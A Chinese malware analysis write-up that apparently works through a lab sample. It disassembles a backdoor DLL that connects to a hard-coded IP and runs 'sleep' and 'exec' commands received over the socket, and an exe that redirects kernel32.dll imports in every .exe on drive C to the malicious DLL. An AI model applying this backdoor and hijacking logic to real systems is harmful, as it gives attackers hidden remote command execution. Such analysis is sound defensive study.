0x00 前言
-------

这次分析的是一个exe +dll文件，很明显，在exe执行的时候应该要动态链接该dll的，那就一个个分析，逐一攻破。

详细分析
----

### 0x01 DLL文件

几个导入函数。包括 `CreateProcessA`以及`WS2_32.dll` 的通过网络接收和发送数据的函数。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-fb8007486b79b343f8504209764d2ba21430c7cf.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-fb8007486b79b343f8504209764d2ba21430c7cf.png)

但是该dll文件的字符串很有意思，其中还包括了一个 IP地址 `127.26.152.13`

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-253e18f06e384b3059d53e5449421dcd716aad0d.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-253e18f06e384b3059d53e5449421dcd716aad0d.png)

另一点比较奇怪的是该dll文件并没有导出函数。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cf98d42634a2ec4093c00813371c3700f13612b6.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cf98d42634a2ec4093c00813371c3700f13612b6.png)

那就先从入口点分析吧。但是……指令贼多，一句一句分析效率太慢了。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b6cef58d87fe7e4f01342cd1d99e26a500d06050.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b6cef58d87fe7e4f01342cd1d99e26a500d06050.png)

先看call 指令调用的函数吧。

```assembly
10001015            call    alloca_ probe       //调用库函数__alloca_probe分配栈空间
10001059            call    ds:OpenMutexA       //打开互斥量
1000106E            call    ds:CreateMutexA     //创建互斥量  这两个在一起保证同一时间只有这个程序的一个实例在运行
1000107E            call    ds:WSAStartup       //WS2_32.dll的一个函数
10001092            call    ds:socket
100010AF            call    ds:inet addr
100010BB            call    ds:htons
100010CE            call    ds:connect
10001101            call    ds:send
10001113            cal1    ds:shutdown
10001132            call    ds:recv             //一直到这里，都是为了建立网络连接socket通信
1000114B            call    ebp;strncmp 
10001159            call    ds:Sleep
10001170            call    ebp ; strncmp 
100011AF            call    ebx ; CreateProcessA    //创建进程
100011C5            call    ds:Sleep            
```

到这里大概可以猜一下，该dll文件建立通信后创建进程，很像我们建立shell的行为。

接下来看函数的具体参数。

`connect`连接的是 `127.26.152.13`这个IP地址，并且端口是 50h，即80端口。emm80端口，猜测可能走http协议进行通信，找一下通信的流量

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b82ef6e390cd33b58ab9e37d23e59c9f5c5a7d48.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b82ef6e390cd33b58ab9e37d23e59c9f5c5a7d48.png)

这里 buf数组存入了 hello 字符串……好像cobalt strike里的娱乐弹窗……

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-707353f3d8ccf99d789d02f8ee7bc1e99fdfeb61.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-707353f3d8ccf99d789d02f8ee7bc1e99fdfeb61.png)

看下`recv`接收的流量。在 `10001124`处，lea 指令访问 buf，指针指向buf这块缓冲区，接着 `push`了3个参数，调用 `recv`指令，但这里好像也看不出来什么

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-48d3107a2779a762cdf225974bc0e6fe4bc3cbd8.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-48d3107a2779a762cdf225974bc0e6fe4bc3cbd8.png)

接着往下看。`1000114B`cmp 前面是不是 `sleep`字符串，它会在 `10001150`处检查是否返回值是否为0，如果是0，调用 `sleep`函数

也就是说如果远程shell终端发送的命令是sleep，则执行sleep函数

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-bb28962f1b5e7a1dbf606d74d6d2060b0f7bb121.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-bb28962f1b5e7a1dbf606d74d6d2060b0f7bb121.png)

到这里并没有结束，buf 缓冲区还在被使用。首先检查指令是不是 `exec`，如果是，`strncpy`函数返回0，顺序执行，直到 `100011AF`处创建进程。看到`CreateProcessA`有很多参数，不过最重要的还是 `lpCOmmandLine`，它来自`1000119B`处的 `CommandLine`,双击追踪这个参数发现它在栈空间中

```assembly
.text:10001161 loc_10001161:                           ; CODE XREF: DllMain(x,x,x)+142↑j
.text:10001161                 lea     edx, [esp+1208h+buf]
.text:10001168                 push    4               ; MaxCount
.text:1000116A                 push    edx             ; Str2
.text:1000116B                 push    offset aExec    ; "exec"
.text:10001170                 call    ebp ; strncmp
.text:10001172                 add     esp, 0Ch
.text:10001175                 test    eax, eax
.text:10001177                 jnz     short loc_100011B6
.text:10001179                 mov     ecx, 11h
.text:1000117E                 lea     edi, [esp+1208h+StartupInfo]
.text:10001182                 rep stosd
.text:10001184                 lea     eax, [esp+1208h+ProcessInformation]
.text:10001188                 lea     ecx, [esp+1208h+StartupInfo]
.text:1000118C                 push    eax             ; lpProcessInformation
.text:1000118D                 push    ecx             ; lpStartupInfo
.text:1000118E                 push    0               ; lpCurrentDirectory
.text:10001190                 push    0               ; lpEnvironment
.text:10001192                 push    8000000h        ; dwCreationFlags
.text:10001197                 push    1               ; bInheritHandles
.text:10001199                 push    0               ; lpThreadAttributes
.text:1000119B                 lea     edx, [esp+1224h+CommandLine]
.text:100011A2                 push    0               ; lpProcessAttributes
.text:100011A4                 push    edx             ; lpCommandLine
.text:100011A5                 push    0               ; lpApplicationName
.text:100011A7                 mov     [esp+1230h+StartupInfo.cb], 44h ; 'D'
.text:100011AF                 call    ebx ; CreateProcessA
.text:100011B1                 jmp     loc_100010E9
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-8d8e95cbf78ebf301275c36697ed9dc66f213b9c.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-8d8e95cbf78ebf301275c36697ed9dc66f213b9c.png)

追踪到dllmain函数这里，发现它的初始值是 0FFBh，同时`buf`的初始值是`1000h`，说明缓冲区从这里开始。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-a2fef9438afbb5a9ec15efe4c70d43e25a8a1f93.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-a2fef9438afbb5a9ec15efe4c70d43e25a8a1f93.png)

这里大概清楚了这个dll文件会创建进程来实现远程socket通信，对于攻击者来说就是弹shell，也就是后门。但是这个dll文件并没有导出函数，它怎么被调用执行啊……

先放一放，看看exe文件

### 0x02 EXE文件

先看exe的导入表，其中几个重点关注下，当然不止这几个，这里我懒得敲了，等下逐个分析

```php
CreateFileMappingA
CreateFileA
CopyFileA
```

很明显，这里exe文件并没有在运行时导入该dll文件，导入函数中没有 `LoadLibrary/ GetProcAddress`，与前面分析dll文件正好对应

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-494e5895be2fa4c9c41ad606c186a64f7abd170f.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-494e5895be2fa4c9c41ad606c186a64f7abd170f.png)

这几个字符串也是很有意思

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b6337fdf5f01f515c6a275dfe934df8b7ef92265.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b6337fdf5f01f515c6a275dfe934df8b7ef92265.png)

来看一看main函数

```assembly
.text:00401440                 mov     eax, [esp+argc]
.text:00401444                 sub     esp, 44h
.text:00401447                 cmp     eax, 2
.text:0040144A                 push    ebx
.text:0040144B                 push    ebp
.text:0040144C                 push    esi
.text:0040144D                 push    edi
.text:0040144E                 jnz     loc_401813
.text:00401454                 mov     eax, [esp+54h+argv]
.text:00401458                 mov     esi, offset aWarningThisWil ;"WARNING_THIS_WILL_DESTROY_YOUR_MACHINE"
.text:0040145D                 mov     eax, [eax+4]
.text:00401460
.text:00401460 loc_401460:                             ; CODE XREF: _main+42↓j
.text:00401460                 mov     dl, [eax]
.text:00401462                 mov     bl, [esi]
.text:00401464                 mov     cl, dl
.text:00401466                 cmp     dl, bl
.text:00401468                 jnz     short loc_401488
.text:0040146A                 test    cl, cl
.text:0040146C                 jz      short loc_401484
.text:0040146E                 mov     dl, [eax+1]
.text:00401471                 mov     bl, [esi+1]
.text:00401474                 mov     cl, dl
.text:00401476                 cmp     dl, bl
.text:00401478                 jnz     short loc_401488
.text:0040147A                 add     eax, 2
.text:0040147D                 add     esi, 2
.text:00401480                 test    cl, cl
.text:00401482                 jnz     short loc_401460
.text:00401484
.text:00401484 loc_401484:                             ; CODE XREF: _main+2C↑j
.text:00401484                 xor     eax, eax
.text:00401486                 jmp     short loc_40148D
```

先分析关键指令，在 `401447`处会比较 eax/argc （即传递的参数的个数）是否为2，如果不是2，跳转到 `101813`，程序终止，这里启动程序时添加参数是为了防止意外启动造成不必要的后果。否则继续执行。在 `401458`处将 "WARNING\_THIS\_WILL\_DESTROY\_YOUR\_MACHINE" 字符串放入 esi 寄存器中，在 `40145D`中，eax 存储 argv\[1\]。接着比较 argv\[1\] 的值是不是 "WARNING\_THIS\_WILL\_DESTROY\_YOUR\_MACHINE" ，如果不是，跳转到 `401488`,程序终止。注意在 `401482`处的跳转到 `401460`，往回跳转，很明显是个循环。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1dd818bb4567b42ae9f6c869a06b5410ece0860c.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1dd818bb4567b42ae9f6c869a06b5410ece0860c.png)

接下来分析 `40148D`

```assembly
.text:0040148D loc_40148D:                             ; CODE XREF: _main+46↑j
.text:0040148D                 test    eax, eax
.text:0040148F                 jnz     loc_401813
.text:00401495                 mov     edi, ds:CreateFileA
.text:0040149B                 push    eax             ; hTemplateFile
.text:0040149C                 push    eax             ; dwFlagsAndAttributes
.text:0040149D                 push    3               ; dwCreationDisposition
.text:0040149F                 push    eax             ; lpSecurityAttributes
.text:004014A0                 push    1               ; dwShareMode
.text:004014A2                 push    80000000h       ; dwDesiredAccess
.text:004014A7                 push    offset FileName ; "C:\\Windows\\System32\\Kernel32.dll"
.text:004014AC                 call    edi ; CreateFileA
.text:004014AE                 mov     ebx, ds:CreateFileMappingA
.text:004014B4                 push    0               ; lpName
.text:004014B6                 push    0               ; dwMaximumSizeLow
.text:004014B8                 push    0               ; dwMaximumSizeHigh
.text:004014BA                 push    2               ; flProtect
.text:004014BC                 push    0               ; lpFileMappingAttributes
.text:004014BE                 push    eax             ; hFile
.text:004014BF                 mov     [esp+6Ch+hObject], eax
.text:004014C3                 call    ebx ; CreateFileMappingA
.text:004014C5                 mov     ebp, ds:MapViewOfFile
.text:004014CB                 push    0               ; dwNumberOfBytesToMap
.text:004014CD                 push    0               ; dwFileOffsetLow
.text:004014CF                 push    0               ; dwFileOffsetHigh
.text:004014D1                 push    4               ; dwDesiredAccess
.text:004014D3                 push    eax             ; hFileMappingObject
.text:004014D4                 call    ebp ; MapViewOfFile
.text:004014D6                 push    0               ; hTemplateFile
.text:004014D8                 push    0               ; dwFlagsAndAttributes
.text:004014DA                 push    3               ; dwCreationDisposition
.text:004014DC                 push    0               ; lpSecurityAttributes
.text:004014DE                 push    1               ; dwShareMode
.text:004014E0                 mov     esi, eax
.text:004014E2                 push    10000000h       ; dwDesiredAccess
.text:004014E7                 push    offset ExistingFileName ; "Lab07-03.dll"
.text:004014EC                 mov     [esp+70h+argc], esi
.text:004014F0                 call    edi ; CreateFileA
.text:004014F2                 cmp     eax, 0FFFFFFFFh
.text:004014F5                 mov     [esp+54h+var_4], eax
.text:004014F9                 push    0               ; lpName
.text:004014FB                 jnz     short loc_401503
.text:004014FD                 call    ds:exit
```

在`4014AC`处调用了 `CreateFileA`，接着还有 `CreateFileMappingA/MapViewOfFile/`，所以这么多函数到底干了什么？毋庸置疑的是 创建了 `Kernel32.dll`这个文件，`CreateFileMappingA`这是一个共享内存函数，会 创建一个文件映射对象，目的是为了写入内存中，这里的参数就是 `kernel32.dll`，接着利用`MapViewOfFile`将文件映射到进程地址空间

接着往下看，在 `4017D4`这里，调用了两个 `CloseHandle`，因为对前面的文件已经操作完毕。接着在 `4017F4`处调用 `CopyFileA`，将 恶意dll文件 copy为 kernel32.dll，这样就可以理解为什么 该恶意dll文件没有被导出了，很常规的一次dll劫持

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-188ab460dfa98055e68d7e4533cf7926e4600d2f.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-188ab460dfa98055e68d7e4533cf7926e4600d2f.png)

紧接着传入了C盘的盘符，调用了 `4011E0`，

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-04f03f3052e363f1438e649f26ab9433ea7895b5.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-04f03f3052e363f1438e649f26ab9433ea7895b5.png)

来到 `4011E0`处，只调用了 `FindFirstFileA`，来搜索C盘符，

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-4972e93af70b5f31817c733627b21610a303d5ce.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-4972e93af70b5f31817c733627b21610a303d5ce.png)

接下来的call指令就是 `stricmp`，找一下它push的参数，会比较字符串是否是`.exe`，

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-82f76050efb32e4bb50c04189fea9b4c061b42ed.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-82f76050efb32e4bb50c04189fea9b4c061b42ed.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ac8faadf5ad73925a359fc9fb94e7e44ee53376c.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ac8faadf5ad73925a359fc9fb94e7e44ee53376c.png)

在这之后会调用 `FindNextFileA`，查找下一个文件，然后在 `401427`处jmp 到 `401210`，往前跳转，说明这是一个循环，然后在`40142E`处调用 `FindClose`函数，终止。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-d5525e2a386f0bd679ae06db84f2af49d066c88b.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-d5525e2a386f0bd679ae06db84f2af49d066c88b.png)  
到这里，梳理一下，这个函数在找C盘里的exe文件，并且匹配相应的dll，接着进行一系列操作。

接着`call 4011A0`，看到 `4010A0`处的函数调用。

依旧是调用了 `CreateFileA/ CreateFileMappingA/ MapViewOfFile`用来将文件映射到内存中。

接着调用 `IsBadReadPtr`函数，检查调用进程是否具有读取指定内存区域的权限。下面都是对该函数的一些算术运算，直接pass

```assembly
.text:004010A0                 sub     esp, 0Ch
.text:004010A3                 push    ebx
.text:004010A4                 mov     eax, [esp+10h+lpFileName]
.text:004010A8                 push    ebp
.text:004010A9                 push    esi
.text:004010AA                 push    edi
.text:004010AB                 push    0               ; hTemplateFile
.text:004010AD                 push    0               ; dwFlagsAndAttributes
.text:004010AF                 push    3               ; dwCreationDisposition
.text:004010B1                 push    0               ; lpSecurityAttributes
.text:004010B3                 push    1               ; dwShareMode
.text:004010B5                 push    10000000h       ; dwDesiredAccess
.text:004010BA                 push    eax             ; lpFileName
.text:004010BB                 call    ds:CreateFileA
.text:004010C1                 push    0               ; lpName
.text:004010C3                 push    0               ; dwMaximumSizeLow
.text:004010C5                 push    0               ; dwMaximumSizeHigh
.text:004010C7                 push    4               ; flProtect
.text:004010C9                 push    0               ; lpFileMappingAttributes
.text:004010CB                 push    eax             ; hFile
.text:004010CC                 mov     [esp+34h+var_4], eax
.text:004010D0                 call    ds:CreateFileMappingA
.text:004010D6                 push    0               ; dwNumberOfBytesToMap
.text:004010D8                 push    0               ; dwFileOffsetLow
.text:004010DA                 push    0               ; dwFileOffsetHigh
.text:004010DC                 push    0F001Fh         ; dwDesiredAccess
.text:004010E1                 push    eax             ; hFileMappingObject
.text:004010E2                 mov     [esp+30h+hObject], eax
.text:004010E6                 call    ds:MapViewOfFile
.text:004010EC                 mov     esi, eax
.text:004010EE                 test    esi, esi
.text:004010F0                 mov     [esp+1Ch+var_C], esi
.text:004010F4                 jz      loc_4011D5
.text:004010FA                 mov     ebp, [esi+3Ch]
.text:004010FD                 mov     ebx, ds:IsBadReadPtr
.text:00401103                 add     ebp, esi
.text:00401105                 push    4               ; ucb
.text:00401107                 push    ebp             ; lp
.text:00401108                 call    ebx ; IsBadReadPtr
.text:0040110A                 test    eax, eax
.text:0040110C                 jnz     loc_4011D5
.text:00401112                 cmp     dword ptr [ebp+0], 4550h
.text:00401119                 jnz     loc_4011D5
.text:0040111F                 mov     ecx, [ebp+80h]
.text:00401125                 push    esi
.text:00401126                 push    ebp
.text:00401127                 push    ecx
.text:00401128                 call    sub_401040
.text:0040112D                 add     esp, 0Ch
.text:00401130                 mov     edi, eax
.text:00401132                 push    14h             ; ucb
.text:00401134                 push    edi             ; lp
.text:00401135                 call    ebx ; IsBadReadPtr
.text:00401137                 test    eax, eax
.text:00401139                 jnz     loc_4011D5
.text:0040113F                 add     edi, 0Ch
```

继续往下看，找到了 `stricmp`函数调用，来检查 字符串是否是 `kernel32.dll`，接着在`401186`处调用 `repne scasb`，用来重复扫描特定字符串的长度， 在`401196`处调用 `rep movsd`。这里的用处和 `strlen+memcpy`函数是等价的。至于往内存中写入的是什么东西，看下edi寄存器里存的是什么，

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-a333d4e2d9fca324ab5723149a859783487cc3b2.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-a333d4e2d9fca324ab5723149a859783487cc3b2.png)

定位到`403010`处，

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-60aa73eea70541ae1730bd1c584ad15984f1f86e.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-60aa73eea70541ae1730bd1c584ad15984f1f86e.png)

这里存储的是 `kernel32.dll`这个字符串，按下A键，可以看到转换为了该字符串。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-d6c8e197449d971bb724d3294956382a24131a84.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-d6c8e197449d971bb724d3294956382a24131a84.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ca32947ed295663a74b60bb272d5addd27c374b4.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ca32947ed295663a74b60bb272d5addd27c374b4.png)

总结
--

至此，梳理下，这个exe文件遍历C盘查找所有的 exe文件，并且找到其中 `kernel32.dll`的位置，并且用我们的恶意dll文件替换它，简单来说就是劫持 `kernel32.dll`。但是也不对啊，这个恶意dll只是实现了后门的功能，并没有正常`kernel32.dll`的功能，按理说劫持后exe文件会运行失败。

动态分析，在恶意代码运行后，正常`kernel32.dll`的md5并没有被改变，说明该dll没有被修改。而当我们再次看我们的恶意dll时，发现它导出了所有的`kernel32.dll`的导出函数，这些导出函数是重定向后的，相当于做了一次转发。功能还在原来的`kernel32.dll`上，只是程序运行时会加载我们的恶意dll。所以在main函数中访问 `kernel32.dll`和我们的恶意dll，是在解析`kernel32.dll`中的导出段并且在恶意dll中创建一个导出段，用来导出并转发函数。这是一个简单的重定向转发dll劫持。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-f516519d25ed5cb53b490f67679045419d8563e5.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-f516519d25ed5cb53b490f67679045419d8563e5.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-afb4c2e2be5816cd52a95a01963c3d69b7f9c825.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-afb4c2e2be5816cd52a95a01963c3d69b7f9c825.png)